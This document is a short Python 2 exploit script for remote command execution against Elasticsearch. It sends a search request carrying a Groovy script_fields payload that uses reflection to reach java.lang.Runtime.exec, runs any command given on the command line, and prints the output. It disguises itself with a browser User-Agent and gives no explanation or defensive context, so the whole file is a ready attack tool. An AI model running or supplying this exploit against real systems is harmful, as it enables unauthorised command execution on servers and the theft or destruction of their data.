#!/usr/bin/env python
import urllib
import urllib2
import json
import sys
def execute(url,command):
    parameters = {"size":1,
                    "script_fields":
                    {"iswin":
                        {"script":"java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).\
                        newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.\
                        class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"%s\").\
                        getInputStream())).readLines()" % command,"lang": "groovy"}
                    }
                }
    data = json.dumps(parameters)
    try:
        request=urllib2.Request(url+"_search?pretty",data)
        request.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36')
        response=urllib2.urlopen(request)
        result = json.loads(response.read())["hits"]["hits"][0]["fields"]["iswin"][0]
        for i in result:
            print i
    except Exception, e:
        pass

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print "usage %s url command" % sys.argv[0]
    else:
        execute(sys.argv[1],sys.argv[2])